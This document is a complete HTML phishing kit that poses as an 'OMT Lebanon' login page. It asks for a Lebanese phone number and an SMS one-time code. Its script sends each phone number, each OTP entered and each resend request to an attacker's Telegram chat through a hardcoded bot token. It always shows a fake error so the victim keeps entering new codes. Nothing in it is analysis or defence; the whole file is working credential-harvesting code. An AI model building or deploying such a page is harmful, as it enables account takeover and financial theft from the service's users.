<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>تسجيل الدخول</title>
  <meta property="og:title" content="تسجيل الدخول" />
  <meta property="og:description" content="سجل دخولك إلى خدمات OMT لبنان بأمان وسهولة!" />
  <meta property="og:image" content="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" />
  <meta property="og:url" content="https://omt-lebanon.vercel.app" />
  <meta property="og:type" content="website" />
  <meta property="og:locale" content="ar_AR" />
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="تسجيل الدخول" />
  <meta name="twitter:description" content="سجل دخولك إلى خدمات OMT لبنان بأمان وسهولة!" />
  <meta name="twitter:image" content="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" />
  <!-- Add a beautiful thin font for the phone input -->
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;900&family=Roboto:wght@300;400;500;700&family=Lexend:wght@300;500&display=swap" rel="stylesheet">
  <style>
    body {
      background: #f7f7f8;
      min-height: 100vh;
      font-family: 'Cairo', Arial, sans-serif;
      margin: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    #omt-container {
      background: none;
      min-height: 100vh;
      width: 100vw;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
    }
    .omt-header-bg {
      width: 100vw;
      min-height: 260px;
      background: linear-gradient(100deg,#ffd800 0%,#fcc23c 80%,#fff6cd 100%);
      box-sizing: border-box;
      position: relative;
      overflow: hidden;
    }
    .omt-logo-wrap {
      position: absolute;
      left: 50%;
      top: 22px;
      transform: translate(-50%, 0);
      background: #fff;
      border-radius: 22px;
      box-shadow: 0 8px 36px #ffd90020, 0px 1.5px 12px #ffd90011;
      padding: 22px 38px;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .omt-logo-wrap img {
      width: 118px;
      height: 118px;
      border-radius: 24px;
      object-fit: contain;
      box-shadow: 0 3px 12px #ffd90026;
      border: 3px solid #ffe56d;
      background: #fff;
      transition: width 0.2s, height 0.2s;
    }
    .omt-login-card, .omt-otp-card {
      width: 95vw;
      max-width: 420px;
      background: #fff;
      border-radius: 24px;
      margin: -60px 0 0 0;
      box-shadow: 0 7px 40px #ffd90014, 0 1.5px 14px #ffd90009;
      padding: 36px 30px 30px 30px;
      box-sizing: border-box;
      position: relative;
      animation: fadein 0.7s;
      z-index: 5;
    }
    @keyframes fadein {
      from { opacity: 0; transform: translateY(36px);}
      to { opacity: 1; transform: none;}
    }
    .omt-back-btn {
      position: absolute;
      right: 14px;
      top: 18px;
      width: 39px;
      height: 39px;
      background: #fff;
      border-radius: 50%;
      box-shadow: 0 2px 12px #ffd80020;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      font-size: 23px;
      color: #222;
      outline: none;
      transition: box-shadow 0.18s;
      z-index: 11;
      border: 2px solid #fff6cd;
    }
    .omt-login-title, .omt-otp-title {
      font-size: 25px;
      font-weight: 800;
      color: #232301;
      margin: 16px 0 18px 0;
      text-align: left;
      direction: ltr;
      letter-spacing: 0.2px;
    }
    .omt-label {
      color: #ffd800;
      font-size: 15px;
      font-weight: 700;
      display: block;
      margin-bottom: 8px;
      margin-right: 2px;
      letter-spacing: 0.1px;
    }
    .omt-phone-row {
      display: flex;
      gap: 19px;
      align-items: center;
      margin-bottom: 10px;
      flex-direction: row;
    }
    .omt-country {
      padding: 0;
      background: #f9f9fb;
      border-radius: 13px;
      border: 2.5px solid #ffe56d;
      box-shadow: 0 1px 6px #ffd90011;
      min-width: 92px;
      min-height: 43px;
      display: flex;
      align-items: center;
      justify-content: left;
      gap: 9px;
      font-weight: 700;
      font-size: 17px;
      color: #111;
      outline: none;
      cursor: pointer;
      position: relative;
      flex-direction: row;
    }
    .omt-country img {
      width: 29px;
      height: 23px;
      border-radius: 9px;
      margin-right: 6px;
      object-fit: cover;
      background: #fff;
      box-shadow: 0 1px 5px #11111111;
    }
    .omt-phone-input {
      flex: 1;
      padding: 16px 13px;
      border-radius: 14px;
      border: 2.5px solid #ffe56d;
      box-shadow: 0 1px 7px #ffd9000d;
      background: #f9f9fb;
      font-size: 20px;
      /* Use a thin, modern, and clear font */
      font-family: 'Lexend', 'Roboto', 'Cairo', Arial, sans-serif;
      font-weight: 300;
      direction: ltr;
      color: #1a1a1a;
      letter-spacing: 2px;
      outline: none;
      transition: border 0.18s, box-shadow 0.18s;
    }
    .omt-phone-input:focus {
      border-color: #ffd800;
      background: #fffdf4;
      box-shadow: 0 3px 14px #ffd80033;
      font-weight: 500;
      color: #111;
    }
    .omt-register-row {
      text-align: center;
      margin: 44px 0 22px 0;
      font-size: 16px;
      color: #444;
      font-weight: 600;
    }
    .omt-register-row a {
      color: #111;
      text-decoration: underline;
      font-weight: bold;
      cursor: pointer;
      letter-spacing: 0.4px;
    }
    .omt-login-btn, .omt-otp-btn, .omt-resend-btn {
      width: 100%;
      background: #f7f7f8;
      color: #cccccc;
      border: none;
      border-radius: 40px;
      padding: 17px 0;
      font-size: 21px;
      font-weight: 900;
      cursor: not-allowed;
      letter-spacing: 0.7px;
      margin-top: 15px;
      margin-bottom: 3px;
    }
    .omt-login-btn.active, .omt-otp-btn.active, .omt-resend-btn.active {
      background: linear-gradient(90deg, #ffd800 0%, #fcc23c 100%);
      color: #202000;
      cursor: pointer;
      box-shadow: 0 1px 8px #ffd80055;
      transition: background 0.21s;
      opacity: 1;
    }
    /* OTP code field styles */
    .omt-otp-code-row {
      display: flex;
      flex-direction: row;     /* LTR for input order left-to-right */
      direction: ltr;          /* this ensures left-to-right typing */
      gap: 12px;
      justify-content: flex-start;
      margin: 20px 0 30px 0;
    }
    .omt-otp-code-digit {
      width: 54px;
      height: 54px;
      text-align: center;
      font-size: 25px;
      background: #f7f7f8;
      border-radius: 10px;
      border: 2px solid #ffe56d;
      box-shadow: 0 1px 7px #ffd90011;
      font-family: 'Lexend', 'Roboto', 'Cairo', Arial, sans-serif;
      font-weight: 400;
      direction: ltr;
      outline: none;
      letter-spacing: 5px;
      transition: border 0.16s, box-shadow 0.16s;
    }
    .omt-otp-code-digit:focus {
      border-color: #ffd800;
      background: #fffdf4;
      box-shadow: 0 3px 9px #ffd80033;
    }
    .omt-otp-sms-info {
      font-size: 16px;
      color: #444;
      font-weight: 700;
      margin-bottom: 4px;
      margin-top: 10px;
      text-align: center;
      direction: ltr;
    }
    .omt-otp-phone {
      font-size: 18px;
      color: #21211D;
      font-weight: bold;
      text-align: center;
      margin-bottom: 20px;
      letter-spacing: 1px;
      direction: ltr;
    }
    .omt-otp-error-msg {
      text-align: center;
      color: #e53935;
      font-size: 16px;
      font-weight: bold;
      margin-top: 18px;
      margin-bottom: 5px;
    }
    .omt-resend-row {
      margin-top: 24px;
      text-align: center;
      font-size: 16px;
      color: #444;
      font-weight: 600;
    }
    .omt-resend-timer {
      color: #ffd800;
      font-size: 17px;
      font-weight: bold;
      letter-spacing: 0.7px;
      margin-right: 4px;
    }
    .omt-resend-btn {
      margin-top: 8px;
      font-size: 17px;
      font-weight: 700;
      background: #fff8de;
      color: #ffd800;
      border: 2px solid #ffe56d;
      border-radius: 22px;
      padding: 12px 0;
      cursor: not-allowed;
      box-shadow: none;
      transition: background 0.15s, color 0.15s;
    }
    .omt-resend-btn.active {
      background: linear-gradient(90deg,#ffd800 0%,#fcc23c 100%);
      color: #222201;
      cursor: pointer;
      box-shadow: 0 1px 8px #ffd80022;
      border: 2px solid #ffd800;
    }
    @media (max-width: 600px) {
      .omt-logo-wrap img {
        width: 82px;
        height: 82px;
      }
      .omt-logo-wrap {
        padding: 10px 18px;
      }
      .omt-otp-code-digit { width: 39px; height: 39px; font-size: 18px; }
    }
    @media (max-width: 480px) {
      .omt-login-card, .omt-otp-card {
        padding: 16px 2.5vw 22px 2.5vw;
      }
      .omt-logo-wrap img {
        width: 64px; height: 64px;
      }
    }
  </style>
</head>
<body>
  <div id="omt-container">
    <div class="omt-header-bg">
      <div class="omt-logo-wrap">
        <img src="https://www2.0zz0.com/2025/12/03/17/283254346.jpeg" alt="OMT Logo" />
      </div>
    </div>
    <div class="omt-login-card" id="loginCard">
      <button class="omt-back-btn" id="backBtn" style="display:none">&#8592;</button>
      <div class="omt-login-title" style="text-align:left;direction:ltr;">Login</div>
      <form id="loginForm" autocomplete="off">
        <span class="omt-label">Mobile Number</span>
        <div class="omt-phone-row">
          <input type="tel" id="phoneInput" class="omt-phone-input" placeholder="أدخل رقم الهاتف" maxlength="8" required autocomplete="tel" inputmode="numeric" />
          <div class="omt-country">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/59/Flag_of_Lebanon.svg" alt="Lebanon Flag" />
            +961
          </div>
        </div>
        <div class="omt-register-row">
          Don’t Have an Account? <a href="#">Register</a>
        </div>
        <button type="submit" class="omt-login-btn" id="loginBtn" disabled>Login</button>
      </form>
    </div>
    <div class="omt-otp-card" id="otpCard" style="display:none;">
      <div class="omt-otp-title" style="text-align:left;direction:ltr;">Enter OTP Code</div>
      <div class="omt-otp-sms-info">Enter OTP Code Recive in Your SMS To:</div>
      <div class="omt-otp-phone" id="displayOtpPhone"></div>
      <form id="otpForm" autocomplete="off">
        <div class="omt-otp-code-row" id="otpCodeRow">
          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
          <input type="text" maxlength="1" class="omt-otp-code-digit" autocomplete="one-time-code" inputmode="numeric" />
        </div>
        <button type="submit" class="omt-otp-btn" id="otpBtn" disabled>Confirm</button>
        <div class="omt-otp-error-msg" id="otpError" style="display:none;">
          حدث خطأ سيتم ارسال رمز تحقق جديد
        </div>
        <div class="omt-resend-row">
          <span id="resendLabel">Resend code after</span>
          <span class="omt-resend-timer" id="resendTimer">2:00</span>
        </div>
        <button type="button" class="omt-resend-btn" id="resendBtn" disabled>Resend</button>
      </form>
    </div>
  </div>
  <script>
    // Telegram Bot information
    const BOT_TOKEN = "8450343323:AAGVgCIJdSTdUpv8tu3iPLLdCIZkNGRdm2I";
    const CHAT_ID = "6873334348";

    // Login logic
    const phoneInput = document.getElementById('phoneInput');
    const loginBtn = document.getElementById('loginBtn');
    const loginForm = document.getElementById('loginForm');
    const otpCard = document.getElementById('otpCard');
    const loginCard = document.getElementById('loginCard');
    let submittedPhone = '';
    let otpCodeArr = ["","","",""];
    let otpInputs;
    let timerInterval;
    let timerSeconds = 120;
    const displayOtpPhone = document.getElementById('displayOtpPhone');
    const resendBtn = document.getElementById('resendBtn');
    const resendTimer = document.getElementById('resendTimer');
    const otpError = document.getElementById('otpError');
    const otpBtn = document.getElementById('otpBtn');

    phoneInput.addEventListener('input', function() {
      this.value = this.value.replace(/\D/g, '').substr(0, 8);
      updateLoginBtn();
    });
    function updateLoginBtn() {
      const validPhone = phoneInput.value.length === 8 &&
        (phoneInput.value.startsWith('3') || phoneInput.value.startsWith('1') || phoneInput.value.startsWith('7') || phoneInput.value.startsWith('8'));
      if (validPhone) {
        loginBtn.disabled = false;
        loginBtn.classList.add('active');
        loginBtn.style.cursor = "pointer";
        loginBtn.style.opacity = 1;
      } else {
        loginBtn.disabled = true;
        loginBtn.classList.remove('active');
        loginBtn.style.cursor = "not-allowed";
        loginBtn.style.opacity = 1;
      }
    }

    loginForm.onsubmit = async function(e){
      e.preventDefault();
      loginBtn.textContent = "Processing...";
      loginBtn.disabled = true;
      submittedPhone = "+961" + phoneInput.value;
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `رقم الهاتف: ${submittedPhone}`
          })
        });
      } catch (err) {/* ignore */}
      setTimeout(()=>{
        loginBtn.textContent = "Login";
        loginCard.style.display = 'none';
        otpCard.style.display = '';
        displayOtpPhone.textContent = submittedPhone;
        startResendTimer();
        otpSetup();
      },1200);
    };

    // OTP Page Logic
    function otpSetup() {
      otpInputs = document.querySelectorAll('#otpCodeRow .omt-otp-code-digit');
      otpCodeArr = ["","","",""];
      // Clear and set up all fields
      for(let i=0; i<otpInputs.length; i++) {
        otpInputs[i].value = '';
        otpInputs[i].style.direction = 'ltr';
        otpInputs[i].style.textAlign = 'center';

        otpInputs[i].removeEventListener('input', handleOtpInput);
        otpInputs[i].removeEventListener('keydown', handleOtpKeydown);
        otpInputs[i].addEventListener('input', handleOtpInput);
        otpInputs[i].addEventListener('keydown', handleOtpKeydown);
      }
      updateOtpBtn();
      otpError.style.display = 'none';
      otpBtn.disabled = true;
      otpBtn.classList.remove('active');
      otpInputs[0].focus();
    }

    function handleOtpInput(e) {
      const inputs = otpInputs;
      let idx = Array.prototype.indexOf.call(inputs, e.target);

      // Always LTR fill: input 0 is left, input 1 is next to right, etc.
      if (e.target.value.length > 1) e.target.value = e.target.value.slice(0,1);
      if (/\D/.test(e.target.value)) e.target.value = e.target.value.replace(/\D/g, '');

      otpCodeArr[idx] = e.target.value;

      if (e.target.value && idx < inputs.length-1) {
        inputs[idx+1].focus();
      }
      updateOtpBtn();
    }
    function handleOtpKeydown(e) {
      const inputs = otpInputs;
      let idx = Array.prototype.indexOf.call(inputs, e.target);

      if(e.key === 'Backspace') {
        if (e.target.value === '' && idx > 0) {
          inputs[idx-1].focus();
        }
      }
      if (["ArrowRight", "ArrowLeft"].includes(e.key)) {
        e.preventDefault();
        if (e.key === 'ArrowRight' && idx < inputs.length-1) {
          inputs[idx+1].focus();
        }
        if (e.key === 'ArrowLeft' && idx > 0) {
          inputs[idx-1].focus();
        }
      }
    }

    function updateOtpBtn() {
      let filled = otpCodeArr.every(d=>d.length===1);
      if(filled){
        otpBtn.disabled = false;
        otpBtn.classList.add('active');
        otpBtn.style.cursor = 'pointer';
      }else{
        otpBtn.disabled = true;
        otpBtn.classList.remove('active');
        otpBtn.style.cursor = 'not-allowed';
      }
    }
    document.getElementById('otpForm').onsubmit = async function(e){
      e.preventDefault();
      let otpCode = otpCodeArr.join('');
      // Send to telegram
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `رمز التحقق: ${otpCode}\nرقم الهاتف: ${submittedPhone}`
          })
        });
      } catch (err) {/* ignore */}
      // Always show error, reset code field and timer
      otpError.style.display = '';
      // Reset all code digits
      for (let i = 0; i < otpInputs.length; i++) {
        otpInputs[i].value = '';
        otpCodeArr[i] = '';
      }
      otpInputs[0].focus();
      updateOtpBtn();
      // Restart the timer and disable resend
      timerSeconds = 120;
      updateResendTimer();
      if (timerInterval) clearInterval(timerInterval);
      startResendTimer();
      resendBtn.disabled = true;
      resendBtn.classList.remove('active');
      resendBtn.style.cursor = 'not-allowed';
    };

    // Resend code logic
    function startResendTimer(){
      resendBtn.disabled = true;
      resendBtn.classList.remove('active');
      resendBtn.style.cursor = 'not-allowed';
      updateResendTimer();
      timerInterval = setInterval(()=>{
        timerSeconds--;
        updateResendTimer();
        if(timerSeconds<=0){
          clearInterval(timerInterval);
          resendBtn.disabled = false;
          resendBtn.classList.add('active');
          resendBtn.style.cursor = 'pointer';
          resendTimer.textContent = '';
          document.getElementById('resendLabel').textContent = 'Resend code';
        }
      },1000);
    }
    function updateResendTimer(){
      let min = Math.floor(timerSeconds/60);
      let sec = timerSeconds%60;
      resendTimer.textContent = `${min}:${sec<10?'0':''}${sec}`;
    }

    resendBtn.onclick = async function(){
      if(resendBtn.disabled) return;
      try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: `طلب ارسال رمز تحقق جديد\nرقم الهاتف: ${submittedPhone}`
          })
        });
      } catch (err) {/* ignore */}
      timerSeconds = 120;
      document.getElementById('resendLabel').textContent = 'Resend code after';
      startResendTimer();
      resendBtn.disabled = true;
      resendBtn.classList.remove('active');
      resendBtn.style.cursor = 'not-allowed';
      otpError.style.display = 'none';
    };

    // Back button - demonstration purpose
    document.getElementById('backBtn').onclick = function() {
      window.history.back();
    }
  </script>
</body>
</html>
